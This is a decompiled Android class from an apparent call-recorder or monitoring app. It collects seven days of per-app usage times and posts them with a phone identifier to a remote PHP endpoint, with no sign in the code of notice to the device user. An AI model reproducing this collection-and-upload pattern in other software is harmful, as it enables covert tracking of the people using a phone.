package com.yasoka.spcallrecord.recorder.call.a.c.g;

import a.c.b.C0074f;
import a.c.b.C0086s;
import a.c.e.a;
import a.c.e.e;
import a.c.j.c;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build.VERSION;
import androidx.annotation.RequiresApi;
import com.crashlytics.android.Crashlytics;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Map.Entry;
import org.json.JSONArray;
import org.json.JSONObject;

/* compiled from: UsageApps */
public class n extends Thread {

    /* renamed from: a reason: collision with root package name */
    private final Context f255a;

    /* renamed from: b reason: collision with root package name */
    private List<String> f256b = Arrays.asList(new String[]{"com.google.android.googlequicksearchbox", "com.google.android.inputmethod.latin", "com.sec.android.app.launcher", "com.android.launcher3", "com.google.android.apps.nexuslauncher", "com.htc.launcher", "com.android.systemui.navigationbar", "com.android.systemui", "com.android.settings", "com.google.android.packageinstaller"});

    public n(Context context) {
        this.f255a = context;
    }

    @RequiresApi(api = 21)
    private JSONArray a(Context context, UsageStatsManager usageStatsManager, long j, long j2) {
        String str;
        JSONArray jSONArray = new JSONArray();
        if (usageStatsManager != null) {
            try {
                for (Entry entry : usageStatsManager.queryAndAggregateUsageStats(j, j2).entrySet()) {
                    String str2 = (String) entry.getKey();
                    if (!this.f256b.contains(str2)) {
                        UsageStats usageStats = (UsageStats) entry.getValue();
                        if (usageStats.getTotalTimeInForeground() != 0) {
                            try {
                                PackageManager packageManager = context.getPackageManager();
                                str = packageManager.getApplicationInfo(str2, 0).loadLabel(packageManager).toString();
                            } catch (Exception e2) {
                                e2.getStackTrace();
                                str = str2;
                            }
                            JSONObject jSONObject = new JSONObject();
                            jSONObject.put("nameApp", str);
                            jSONObject.put("namePackage", str2);
                            jSONObject.put("totalTime", usageStats.getTotalTimeInForeground());
                            jSONArray.put(jSONObject);
                        }
                    }
                }
            } catch (Exception e3) {
                e3.getStackTrace();
                try {
                    e3.getStackTrace();
                    Crashlytics.logException(e3);
                } catch (Exception unused) {
                }
            }
        }
        return jSONArray;
    }

    /* JADX WARNING: Can't wrap try/catch for region: R(8:16|17|18|19|(1:21)(1:22)|23|29|30) */
    /* JADX WARNING: Missing exception handler attribute for start block: B:29:0x00a4 */
    public void run() {
        UsageStatsManager usageStatsManager;
        String str;
        long j;
        String str2;
        Context context = this.f255a;
        try {
            if (VERSION.SDK_INT >= 21 && c.j(context)) {
                String str3 = "usagestats";
                if (VERSION.SDK_INT >= 22) {
                    usageStatsManager = (UsageStatsManager) context.getSystemService(str3);
                } else {
                    usageStatsManager = (UsageStatsManager) context.getSystemService(str3);
                }
                UsageStatsManager usageStatsManager2 = usageStatsManager;
                JSONArray jSONArray = new JSONArray();
                int i = 1;
                while (true) {
                    str = "";
                    if (i > 7) {
                        break;
                    }
                    Calendar instance = Calendar.getInstance();
                    int i2 = -i;
                    instance.add(5, i2);
                    instance.set(11, 0);
                    instance.set(12, 0);
                    instance.set(13, 0);
                    long timeInMillis = instance.getTimeInMillis();
                    Calendar instance2 = Calendar.getInstance();
                    instance2.add(5, i2);
                    instance2.set(11, 23);
                    instance2.set(12, 59);
                    instance2.set(13, 59);
                    long timeInMillis2 = instance2.getTimeInMillis();
                    try {
                        if (Locale.getDefault().getLanguage().contains("fr")) {
                            str2 = new SimpleDateFormat("dd/MM/yyyy", Locale.FRANCE).format(instance.getTime());
                        } else {
                            str2 = new SimpleDateFormat("yyyy/MM/dd", Locale.US).format(instance.getTime());
                        }
                        str = str2;
                    } catch (Throwable th) {
                        th.getStackTrace();
                        th.getStackTrace();
                        Crashlytics.logException(th);
                    }
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put("day", str);
                    jSONObject.put("listApps", a(context, usageStatsManager2, timeInMillis, timeInMillis2));
                    jSONArray.put(jSONObject);
                    i++;
                }
                HashMap hashMap = new HashMap();
                StringBuilder sb = new StringBuilder();
                sb.append(str);
                sb.append(e.e(context));
                hashMap.put("idPhone", sb.toString());
                hashMap.put("dataUsage", jSONArray.toString());
                try {
                    String jSONArray2 = jSONArray.toString();
                    try {
                        C0074f fVar = new C0074f(context);
                        C0086s sVar = new C0086s(jSONArray2);
                        fVar.b();
                        j = fVar.a(sVar);
                        fVar.a();
                    } catch (Exception e2) {
                        e2.getStackTrace();
                        j = -1;
                    }
                    if (a.b("applications/insertApplicationsUsage.php", (Map<String, String>) hashMap)) {
                        int i3 = (int) j;
                        try {
                            C0074f fVar2 = new C0074f(context);
                            fVar2.b();
                            fVar2.a(i3);
                            fVar2.a();
                        } catch (Exception e3) {
                            e3.getStackTrace();
                            try {
                                e3.getStackTrace();
                                Crashlytics.logException(e3);
                            } catch (Exception unused) {
                            }
                        }
                    }
                } catch (Exception e4) {
                    e4.getStackTrace();
                    e4.getStackTrace();
                    Crashlytics.logException(e4);
                }
            }
        } catch (Exception e5) {
            e5.getStackTrace();
            e5.getStackTrace();
            Crashlytics.logException(e5);
        }
    }
}
